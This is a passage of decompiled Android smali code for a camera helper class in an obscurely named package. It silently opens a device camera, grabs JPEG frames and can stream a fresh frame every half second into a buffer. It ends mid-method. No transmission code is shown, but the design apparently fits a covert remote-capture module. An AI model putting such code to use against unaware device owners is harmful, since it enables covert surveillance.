.class final Lcom/servers/ozzbzk/CameraCaptureHelper;
.super Ljava/lang/Object;


# static fields
.field private static final CAPTURE_TIMEOUT_MS:J = 0x1f40L

.field private static final HEIGHT:I = 0x1e0

.field private static final STREAM_INTERVAL_MS:J = 0x1f4L

.field private static final TAG:Ljava/lang/String; = "CameraCapture"

.field private static final WIDTH:I = 0x280


# instance fields
.field private final context:Landroid/content/Context;

.field private final jpegLock:Ljava/lang/Object;

.field private volatile latestJpeg:[B

.field private volatile streamFuture:Ljava/util/concurrent/Future;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/concurrent/Future<",
            "*>;"
        }
    .end annotation
.end field

.field private final streaming:Ljava/util/concurrent/atomic/AtomicBoolean;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 2

    .line 46
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 41
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    iput-object v0, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->jpegLock:Ljava/lang/Object;

    .line 43
    new-instance v0, Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v1, 0x0

    invoke-direct {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;-><init>(Z)V

    iput-object v0, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->streaming:Ljava/util/concurrent/atomic/AtomicBoolean;

    .line 47
    iput-object p1, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->context:Landroid/content/Context;

    return-void
.end method

.method private captureJpeg(I)[B
    .locals 14

    const/4 v0, 0x0

    .line 111
    :try_start_0
    iget-object v1, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->context:Landroid/content/Context;

    const-string v2, "camera"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/hardware/camera2/CameraManager;

    if-nez v1, :cond_0

    return-object v0

    .line 115
    :cond_0
    invoke-static {v1, p1}, Lcom/servers/ozzbzk/CameraCaptureHelper;->pickCameraId(Landroid/hardware/camera2/CameraManager;I)Ljava/lang/String;

    move-result-object p1

    if-nez p1, :cond_1

    return-object v0

    .line 120
    :cond_1
    new-instance v2, Landroid/os/HandlerThread;

    const-string v3, "bridge-c2"

    invoke-direct {v2, v3}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_0 .. :try_end_0} :catch_1b
    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_1b
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1b
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_17
    .catchall {:try_start_0 .. :try_end_0} :catchall_4

    .line 121
    :try_start_1
    invoke-virtual {v2}, Landroid/os/HandlerThread;->start()V

    .line 122
    new-instance v3, Landroid/os/Handler;

    invoke-virtual {v2}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v3, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 124
    new-instance v4, Ljava/util/concurrent/CountDownLatch;

    const/4 v5, 0x1

    invoke-direct {v4, v5}, Ljava/util/concurrent/CountDownLatch;-><init>(I)V

    .line 125
    new-instance v6, Ljava/util/concurrent/atomic/AtomicReference;

    invoke-direct {v6}, Ljava/util/concurrent/atomic/AtomicReference;-><init>()V

    .line 126
    new-instance v7, Lcom/servers/ozzbzk/CameraCaptureHelper$1;

    invoke-direct {v7, p0, v6, v4}, Lcom/servers/ozzbzk/CameraCaptureHelper$1;-><init>(Lcom/servers/ozzbzk/CameraCaptureHelper;Ljava/util/concurrent/atomic/AtomicReference;Ljava/util/concurrent/CountDownLatch;)V

    invoke-virtual {v1, p1, v7, v3}, Landroid/hardware/camera2/CameraManager;->openCamera(Ljava/lang/String;Landroid/hardware/camera2/CameraDevice$StateCallback;Landroid/os/Handler;)V

    .line 146
    sget-object p1, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v7, 0x1f40

    invoke-virtual {v4, v7, v8, p1}, Ljava/util/concurrent/CountDownLatch;->await(JLjava/util/concurrent/TimeUnit;)Z

    move-result p1
    :try_end_1
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_1 .. :try_end_1} :catch_13
    .catch Ljava/lang/SecurityException; {:try_start_1 .. :try_end_1} :catch_13
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_13
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_12
    .catchall {:try_start_1 .. :try_end_1} :catchall_3

    if-nez p1, :cond_2

    .line 239
    invoke-virtual {v2}, Landroid/os/HandlerThread;->quitSafely()Z

    return-object v0

    .line 149
    :cond_2
    :try_start_2
    invoke-virtual {v6}, Ljava/util/concurrent/atomic/AtomicReference;->get()Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/hardware/camera2/CameraDevice;
    :try_end_2
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_2 .. :try_end_2} :catch_13
    .catch Ljava/lang/SecurityException; {:try_start_2 .. :try_end_2} :catch_13
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_13
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_12
    .catchall {:try_start_2 .. :try_end_2} :catchall_3

    if-nez p1, :cond_4

    if-eqz p1, :cond_3

    .line 226
    :try_start_3
    invoke-virtual {p1}, Landroid/hardware/camera2/CameraDevice;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    .line 239
    :catch_0
    :cond_3
    invoke-virtual {v2}, Landroid/os/HandlerThread;->quitSafely()Z

    return-object v0

    :cond_4
    const/16 v1, 0x1e0

    const/16 v4, 0x100

    const/4 v6, 0x2

    const/16 v9, 0x280

    .line 154
    :try_start_4
    invoke-static {v9, v1, v4, v6}, Landroid/media/ImageReader;->newInstance(IIII)Landroid/media/ImageReader;

    move-result-object v1
    :try_end_4
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_4 .. :try_end_4} :catch_11
    .catch Ljava/lang/SecurityException; {:try_start_4 .. :try_end_4} :catch_11
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_11
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_10
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 155
    :try_start_5
    invoke-virtual {v1}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    move-result-object v4

    .line 157
    new-instance v9, Ljava/util/concurrent/CountDownLatch;

    invoke-direct {v9, v5}, Ljava/util/concurrent/CountDownLatch;-><init>(I)V

    .line 158
    new-instance v10, Ljava/util/concurrent/atomic/AtomicReference;

    invoke-direct {v10}, Ljava/util/concurrent/atomic/AtomicReference;-><init>()V

    .line 159
    new-instance v11, Lcom/servers/ozzbzk/CameraCaptureHelper$$ExternalSyntheticLambda0;

    invoke-direct {v11, v10, v9}, Lcom/servers/ozzbzk/CameraCaptureHelper$$ExternalSyntheticLambda0;-><init>(Ljava/util/concurrent/atomic/AtomicReference;Ljava/util/concurrent/CountDownLatch;)V

    invoke-virtual {v1, v11, v3}, Landroid/media/ImageReader;->setOnImageAvailableListener(Landroid/media/ImageReader$OnImageAvailableListener;Landroid/os/Handler;)V

    .line 176
    new-instance v11, Ljava/util/concurrent/CountDownLatch;

    invoke-direct {v11, v5}, Ljava/util/concurrent/CountDownLatch;-><init>(I)V

    .line 177
    new-instance v5, Ljava/util/concurrent/atomic/AtomicReference;

    invoke-direct {v5}, Ljava/util/concurrent/atomic/AtomicReference;-><init>()V

    .line 180
    invoke-static {v4}, Ljava/util/Collections;->singletonList(Ljava/lang/Object;)Ljava/util/List;

    move-result-object v12

    new-instance v13, Lcom/servers/ozzbzk/CameraCaptureHelper$2;

    invoke-direct {v13, p0, v5, v11}, Lcom/servers/ozzbzk/CameraCaptureHelper$2;-><init>(Lcom/servers/ozzbzk/CameraCaptureHelper;Ljava/util/concurrent/atomic/AtomicReference;Ljava/util/concurrent/CountDownLatch;)V

    .line 179
    invoke-virtual {p1, v12, v13, v3}, Landroid/hardware/camera2/CameraDevice;->createCaptureSession(Ljava/util/List;Landroid/hardware/camera2/CameraCaptureSession$StateCallback;Landroid/os/Handler;)V

    .line 195
    sget-object v12, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v11, v7, v8, v12}, Ljava/util/concurrent/CountDownLatch;->await(JLjava/util/concurrent/TimeUnit;)Z

    move-result v11
    :try_end_5
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_5 .. :try_end_5} :catch_f
    .catch Ljava/lang/SecurityException; {:try_start_5 .. :try_end_5} :catch_f
    .catch Ljava/lang/InterruptedException; {:try_start_5 .. :try_end_5} :catch_f
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_e
    .catchall {:try_start_5 .. :try_end_5} :catchall_1

    if-nez v11, :cond_7

    if-eqz p1, :cond_5

    .line 226
    :try_start_6
    invoke-virtual {p1}, Landroid/hardware/camera2/CameraDevice;->close()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_0

    :catch_1
    nop

    :cond_5
    :goto_0
    if-eqz v1, :cond_6

    .line 233
    :try_start_7
    invoke-virtual {v1}, Landroid/media/ImageReader;->close()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    .line 239
    :catch_2
    :cond_6
    invoke-virtual {v2}, Landroid/os/HandlerThread;->quitSafely()Z

    return-object v0

    .line 198
    :cond_7
    :try_start_8
    invoke-virtual {v5}, Ljava/util/concurrent/atomic/AtomicReference;->get()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/hardware/camera2/CameraCaptureSession;
    :try_end_8
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_8 .. :try_end_8} :catch_f
    .catch Ljava/lang/SecurityException; {:try_start_8 .. :try_end_8} :catch_f
    .catch Ljava/lang/InterruptedException; {:try_start_8 .. :try_end_8} :catch_f
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_e
    .catchall {:try_start_8 .. :try_end_8} :catchall_1

    if-nez v5, :cond_b

    if-eqz v5, :cond_8

    .line 219
    :try_start_9
    invoke-virtual {v5}, Landroid/hardware/camera2/CameraCaptureSession;->close()V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_3

    goto :goto_1

    :catch_3
    nop

    :cond_8
    :goto_1
    if-eqz p1, :cond_9

    .line 226
    :try_start_a
    invoke-virtual {p1}, Landroid/hardware/camera2/CameraDevice;->close()V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_4

    goto :goto_2

    :catch_4
    nop

    :cond_9
    :goto_2
    if-eqz v1, :cond_a

    .line 233
    :try_start_b
    invoke-virtual {v1}, Landroid/media/ImageReader;->close()V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_5

    .line 239
    :catch_5
    :cond_a
    invoke-virtual {v2}, Landroid/os/HandlerThread;->quitSafely()Z

    return-object v0

    .line 204
    :cond_b
    :try_start_c
    invoke-virtual {p1, v6}, Landroid/hardware/camera2/CameraDevice;->createCaptureRequest(I)Landroid/hardware/camera2/CaptureRequest$Builder;

    move-result-object v6

    .line 205
    invoke-virtual {v6, v4}, Landroid/hardware/camera2/CaptureRequest$Builder;->addTarget(Landroid/view/Surface;)V

    .line 206
    invoke-virtual {v6}, Landroid/hardware/camera2/CaptureRequest$Builder;->build()Landroid/hardware/camera2/CaptureRequest;

    move-result-object v4

    invoke-virtual {v5, v4, v0, v3}, Landroid/hardware/camera2/CameraCaptureSession;->capture(Landroid/hardware/camera2/CaptureRequest;Landroid/hardware/camera2/CameraCaptureSession$CaptureCallback;Landroid/os/Handler;)I

    .line 208
    sget-object v3, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-virtual {v9, v7, v8, v3}, Ljava/util/concurrent/CountDownLatch;->await(JLjava/util/concurrent/TimeUnit;)Z

    move-result v3
    :try_end_c
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_c .. :try_end_c} :catch_d
    .catch Ljava/lang/SecurityException; {:try_start_c .. :try_end_c} :catch_d
    .catch Ljava/lang/InterruptedException; {:try_start_c .. :try_end_c} :catch_d
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_c
    .catchall {:try_start_c .. :try_end_c} :catchall_0

    if-nez v3, :cond_f

    if-eqz v5, :cond_c

    .line 219
    :try_start_d
    invoke-virtual {v5}, Landroid/hardware/camera2/CameraCaptureSession;->close()V
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_6

    goto :goto_3

    :catch_6
    nop

    :cond_c
    :goto_3
    if-eqz p1, :cond_d

    .line 226
    :try_start_e
    invoke-virtual {p1}, Landroid/hardware/camera2/CameraDevice;->close()V
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_7

    goto :goto_4

    :catch_7
    nop

    :cond_d
    :goto_4
    if-eqz v1, :cond_e

    .line 233
    :try_start_f
    invoke-virtual {v1}, Landroid/media/ImageReader;->close()V
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_8

    .line 239
    :catch_8
    :cond_e
    invoke-virtual {v2}, Landroid/os/HandlerThread;->quitSafely()Z

    return-object v0

    .line 211
    :cond_f
    :try_start_10
    invoke-virtual {v10}, Ljava/util/concurrent/atomic/AtomicReference;->get()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, [B
    :try_end_10
    .catch Landroid/hardware/camera2/CameraAccessException; {:try_start_10 .. :try_end_10} :catch_d
    .catch Ljava/lang/SecurityException; {:try_start_10 .. :try_end_10} :catch_d
    .catch Ljava/lang/InterruptedException; {:try_start_10 .. :try_end_10} :catch_d
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_c
    .catchall {:try_start_10 .. :try_end_10} :catchall_0

    if-eqz v5, :cond_10

    .line 219
    :try_start_11
    invoke-virtual {v5}, Landroid/hardware/camera2/CameraCaptureSession;->close()V
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_9

    goto :goto_5

    :catch_9
    nop

    :cond_10
    :goto_5
    if-eqz p1, :cond_11

    .line 226
    :try_start_12
    invoke-virtual {p1}, Landroid/hardware/camera2/CameraDevice;->close()V
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_a

    goto :goto_6

    :catch_a
    nop

    :cond_11
    :goto_6
    if-eqz v1, :cond_12

    .line 233
    :try_start_13
    invoke-virtual {v1}, Landroid/media/ImageReader;->close()V
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_b

    .line 239
    :catch_b
    :cond_12
    invoke-virtual {v2}, Landroid/os/HandlerThread;->quitSafely()Z

    return-object v3

    :catchall_0
    move-exception v0

    goto :goto_a

    :catch_c
    nop

    goto/16 :goto_e

    :catch_d
    nop

    goto/16 :goto_12

    :catchall_1
    move-exception v3

    move-object v5, v0

    move-object v0, v3

    goto :goto_a

    :catch_e
    nop

    move-object v5, v0

    goto/16 :goto_e

    :catch_f
    nop

    move-object v5, v0

    goto/16 :goto_12

    :catchall_2
    move-exception v1

    move-object v5, v0

    move-object v0, v1

    move-object v1, v5

    goto :goto_a

    :catch_10
    nop

    move-object v1, v0

    goto :goto_7

    :catch_11
    nop

    move-object v1, v0

    goto :goto_8

    :catchall_3
    move-exception p1

    move-object v1, v0

    move-object v5, v1

    goto :goto_9

    :catch_12
    nop

    move-object p1, v0

    move-object v1, p1

    :goto_7
    move-object v5, v1

    goto :goto_e

    :catch_13
    nop

    move-object p1, v0

    move-object v1, p1

    :goto_8
    move-object v5, v1

    goto :goto_12

    :catchall_4
    move-exception p1

    move-object v1, v0

    move-object v2, v1

    move-object v5, v2

    :goto_9
    move-object v0, p1

    move-object p1, v5

    :goto_a
    if-eqz v5, :cond_13

    .line 219
    :try_start_14
    invoke-virtual {v5}, Landroid/hardware/camera2/CameraCaptureSession;->close()V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_14

    goto :goto_b

    :catch_14
    nop

    :cond_13
    :goto_b
    if-eqz p1, :cond_14

    .line 226
    :try_start_15
    invoke-virtual {p1}, Landroid/hardware/camera2/CameraDevice;->close()V
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_15

    goto :goto_c

    :catch_15
    nop

    :cond_14
    :goto_c
    if-eqz v1, :cond_15

    .line 233
    :try_start_16
    invoke-virtual {v1}, Landroid/media/ImageReader;->close()V
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_16

    goto :goto_d

    :catch_16
    nop

    :cond_15
    :goto_d
    if-eqz v2, :cond_16

    .line 239
    invoke-virtual {v2}, Landroid/os/HandlerThread;->quitSafely()Z

    .line 241
    :cond_16
    throw v0

    :catch_17
    nop

    move-object p1, v0

    move-object v1, p1

    move-object v2, v1

    move-object v5, v2

    :goto_e
    if-eqz v5, :cond_17

    .line 219
    :try_start_17
    invoke-virtual {v5}, Landroid/hardware/camera2/CameraCaptureSession;->close()V
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_18

    goto :goto_f

    :catch_18
    nop

    :cond_17
    :goto_f
    if-eqz p1, :cond_18

    .line 226
    :try_start_18
    invoke-virtual {p1}, Landroid/hardware/camera2/CameraDevice;->close()V
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_19

    goto :goto_10

    :catch_19
    nop

    :cond_18
    :goto_10
    if-eqz v1, :cond_19

    .line 233
    :try_start_19
    invoke-virtual {v1}, Landroid/media/ImageReader;->close()V
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_1a

    goto :goto_11

    :catch_1a
    nop

    :cond_19
    :goto_11
    if-eqz v2, :cond_1a

    .line 239
    invoke-virtual {v2}, Landroid/os/HandlerThread;->quitSafely()Z

    :cond_1a
    return-object v0

    :catch_1b
    nop

    move-object p1, v0

    move-object v1, p1

    move-object v2, v1

    move-object v5, v2

    :goto_12
    if-eqz v5, :cond_1b

    .line 219
    :try_start_1a
    invoke-virtual {v5}, Landroid/hardware/camera2/CameraCaptureSession;->close()V
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_1c

    goto :goto_13

    :catch_1c
    nop

    :cond_1b
    :goto_13
    if-eqz p1, :cond_1c

    .line 226
    :try_start_1b
    invoke-virtual {p1}, Landroid/hardware/camera2/CameraDevice;->close()V
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_1d

    goto :goto_14

    :catch_1d
    nop

    :cond_1c
    :goto_14
    if-eqz v1, :cond_1d

    .line 233
    :try_start_1c
    invoke-virtual {v1}, Landroid/media/ImageReader;->close()V
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_1e

    goto :goto_15

    :catch_1e
    nop

    :cond_1d
    :goto_15
    if-eqz v2, :cond_1e

    .line 239
    invoke-virtual {v2}, Landroid/os/HandlerThread;->quitSafely()Z

    :cond_1e
    return-object v0
.end method

.method private static imageToBytes(Landroid/media/Image;)[B
    .locals 1

    .line 263
    invoke-virtual {p0}, Landroid/media/Image;->getPlanes()[Landroid/media/Image$Plane;

    move-result-object p0

    if-eqz p0, :cond_1

    .line 264
    array-length v0, p0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    .line 267
    aget-object p0, p0, v0

    invoke-virtual {p0}, Landroid/media/Image$Plane;->getBuffer()Ljava/nio/ByteBuffer;

    move-result-object p0

    .line 268
    invoke-virtual {p0}, Ljava/nio/ByteBuffer;->remaining()I

    move-result v0

    new-array v0, v0, [B

    .line 269
    invoke-virtual {p0, v0}, Ljava/nio/ByteBuffer;->get([B)Ljava/nio/ByteBuffer;

    return-object v0

    :cond_1
    :goto_0
    const/4 p0, 0x0

    return-object p0
.end method

.method static synthetic lambda$captureJpeg$1(Ljava/util/concurrent/atomic/AtomicReference;Ljava/util/concurrent/CountDownLatch;Landroid/media/ImageReader;)V
    .locals 3

    const-string v0, "image acquire failed: "

    const/4 v1, 0x0

    .line 162
    :try_start_0
    invoke-virtual {p2}, Landroid/media/ImageReader;->acquireLatestImage()Landroid/media/Image;

    move-result-object v1

    if-eqz v1, :cond_0

    .line 164
    invoke-static {v1}, Lcom/servers/ozzbzk/CameraCaptureHelper;->imageToBytes(Landroid/media/Image;)[B

    move-result-object p2

    invoke-virtual {p0, p2}, Ljava/util/concurrent/atomic/AtomicReference;->set(Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :cond_0
    if-eqz v1, :cond_1

    .line 170
    :goto_0
    invoke-virtual {v1}, Landroid/media/Image;->close()V

    .line 172
    :cond_1
    invoke-virtual {p1}, Ljava/util/concurrent/CountDownLatch;->countDown()V

    goto :goto_1

    :catchall_0
    move-exception p0

    goto :goto_2

    :catch_0
    move-exception p0

    .line 167
    :try_start_1
    const-string p2, "CameraCapture"

    invoke-virtual {p0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-static {p2, p0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    if-eqz v1, :cond_1

    goto :goto_0

    :goto_1
    return-void

    :goto_2
    if-eqz v1, :cond_2

    .line 170
    invoke-virtual {v1}, Landroid/media/Image;->close()V

    .line 172
    :cond_2
    invoke-virtual {p1}, Ljava/util/concurrent/CountDownLatch;->countDown()V

    .line 173
    throw p0
.end method

.method private static pickCameraId(Landroid/hardware/camera2/CameraManager;I)Ljava/lang/String;
    .locals 8
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Landroid/hardware/camera2/CameraAccessException;
        }
    .end annotation

    .line 246
    invoke-virtual {p0}, Landroid/hardware/camera2/CameraManager;->getCameraIdList()[Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_3

    .line 247
    array-length v1, v0

    if-nez v1, :cond_0

    goto :goto_1

    .line 251
    :cond_0
    array-length v1, v0

    const/4 v2, 0x0

    const/4 v3, 0x0

    :goto_0
    const/4 v4, 0x1

    if-ge v3, v1, :cond_2

    aget-object v5, v0, v3

    .line 252
    invoke-virtual {p0, v5}, Landroid/hardware/camera2/CameraManager;->getCameraCharacteristics(Ljava/lang/String;)Landroid/hardware/camera2/CameraCharacteristics;

    move-result-object v6

    .line 253
    sget-object v7, Landroid/hardware/camera2/CameraCharacteristics;->LENS_FACING:Landroid/hardware/camera2/CameraCharacteristics$Key;

    invoke-virtual {v6, v7}, Landroid/hardware/camera2/CameraCharacteristics;->get(Landroid/hardware/camera2/CameraCharacteristics$Key;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/Integer;

    if-eqz v6, :cond_1

    .line 254
    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v6

    if-ne v6, v4, :cond_1

    return-object v5

    :cond_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 258
    :cond_2
    invoke-static {p1, v2}, Ljava/lang/Math;->max(II)I

    move-result p0

    array-length p1, v0

    sub-int/2addr p1, v4

    invoke-static {p0, p1}, Ljava/lang/Math;->min(II)I

    move-result p0

    .line 259
    aget-object p0, v0, p0

    return-object p0

    :cond_3
    :goto_1
    const/4 p0, 0x0

    return-object p0
.end method


# virtual methods
.method captureOnce(I)[B
    .locals 0

    .line 51
    invoke-direct {p0, p1}, Lcom/servers/ozzbzk/CameraCaptureHelper;->captureJpeg(I)[B

    move-result-object p1

    return-object p1
.end method

.method getLatestJpeg()[B
    .locals 2

    .line 55
    iget-object v0, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->jpegLock:Ljava/lang/Object;

    monitor-enter v0

    .line 56
    :try_start_0
    iget-object v1, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->latestJpeg:[B

    monitor-exit v0

    return-object v1

    :catchall_0
    move-exception v1

    .line 57
    monitor-exit v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    throw v1
.end method

.method isStreaming()Z
    .locals 1

    .line 61
    iget-object v0, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->streaming:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v0

    return v0
.end method

.method synthetic lambda$startStream$0$com-servers-ozzbzk-CameraCaptureHelper(I)V
    .locals 4

    .line 70
    :goto_0
    iget-object v0, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->streaming:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 72
    :try_start_0
    invoke-direct {p0, p1}, Lcom/servers/ozzbzk/CameraCaptureHelper;->captureJpeg(I)[B

    move-result-object v0

    if-eqz v0, :cond_0

    .line 73
    array-length v1, v0

    if-lez v1, :cond_0

    .line 74
    iget-object v1, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->jpegLock:Ljava/lang/Object;

    monitor-enter v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 75
    :try_start_1
    iput-object v0, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->latestJpeg:[B

    .line 76
    monitor-exit v1

    goto :goto_1

    :catchall_0
    move-exception v0

    monitor-exit v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    :catch_0
    move-exception v0

    .line 79
    const-string v1, "CameraCapture"

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "stream capture failed: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :cond_0
    :goto_1
    const-wide/16 v0, 0x1f4

    .line 82
    :try_start_3
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0

    .line 84
    :catch_1
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Thread;->interrupt()V

    :cond_1
    return-void
.end method

.method declared-synchronized startStream(I)V
    .locals 2

    monitor-enter p0

    .line 65
    :try_start_0
    iget-object v0, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->streaming:Ljava/util/concurrent/atomic/AtomicBoolean;

    invoke-virtual {v0}, Ljava/util/concurrent/atomic/AtomicBoolean;->get()Z

    move-result v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v0, :cond_0

    .line 66
    monitor-exit p0

    return-void

    .line 68
    :cond_0
    :try_start_1
    iget-object v0, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->streaming:Ljava/util/concurrent/atomic/AtomicBoolean;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/util/concurrent/atomic/AtomicBoolean;->set(Z)V

    .line 69
    new-instance v0, Lcom/servers/ozzbzk/CameraCaptureHelper$$ExternalSyntheticLambda1;

    invoke-direct {v0, p0, p1}, Lcom/servers/ozzbzk/CameraCaptureHelper$$ExternalSyntheticLambda1;-><init>(Lcom/servers/ozzbzk/CameraCaptureHelper;I)V

    invoke-static {v0}, Lcom/servers/ozzbzk/Scheduler;->submitIo(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    move-result-object p1

    iput-object p1, p0, Lcom/servers/ozzbzk/CameraCaptureHelper;->streamFuture:Ljava/util/concurrent/Future;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 89
    monitor-exit p0

    return-void

    :catchall_0
    move-exception p1

    monitor-exit p0

    throw p1
.end method

.method declared-synchronized stopStream()V
    .locals 4

    monitor-enter p0

    .line 92
    :try_start_0
